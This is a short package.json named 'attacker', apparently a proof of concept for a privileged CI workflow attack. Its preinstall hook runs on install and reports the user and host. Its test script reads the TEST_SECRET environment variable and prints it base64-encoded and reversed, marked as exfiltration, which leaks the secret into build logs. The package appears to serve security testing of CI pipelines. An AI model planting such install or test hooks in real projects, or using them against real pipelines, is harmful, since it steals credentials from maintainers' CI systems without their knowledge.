{
  "name": "attacker",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node -e \"const os=require('os');console.log('=== PWN: preinstall ran in PRIVILEGED workflow_run context as '+os.userInfo().username+' on '+os.hostname()+' ===')\"",
    "test": "node -e \"const s=process.env.TEST_SECRET||'(empty)';const b=Buffer.from(s).toString('base64');console.log('=== PWN: secret reached attacker code ===');console.log('TEST_SECRET length: '+s.length);console.log('EXFIL_B64: '+b);console.log('EXFIL_REV: '+s.split('').reverse().join(''));\""
  }
}
